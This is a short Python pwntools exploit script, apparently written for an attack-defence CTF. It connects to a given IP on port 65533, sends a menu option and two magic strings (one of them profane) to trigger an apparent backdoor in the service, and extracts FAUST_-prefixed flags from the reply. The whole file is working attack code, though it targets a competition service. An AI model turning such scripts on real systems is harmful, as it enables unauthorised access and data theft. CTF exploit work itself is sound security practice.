#!/usr/bin/env python2
# -*- coding: utf8 -*-

import sys
import pickle
import random
import re
import json
from pwn import *

def attack(ip, t_id, t_name):
    c = remote(ip, 65533)

    # help
    c.sendline('4')
    c.sendline('you are my only hope')
    c.sendline('fuck')

    all_text = c.clean(timeout=2)

    print(re.findall(r'FAUST_[A-Za-z0-9/\+]{32}', all_text))

def main():
    if len(sys.argv) < 4:
        log.warn('Nope, usage: ./script.py <ip> <id> <name>')
        sys.exit(1)

    ip = sys.argv[1]
    t_id = sys.argv[2]
    t_name = sys.argv[3]

    attack(ip, t_id, t_name)
    sys.exit(0)

if __name__ == '__main__':
    main()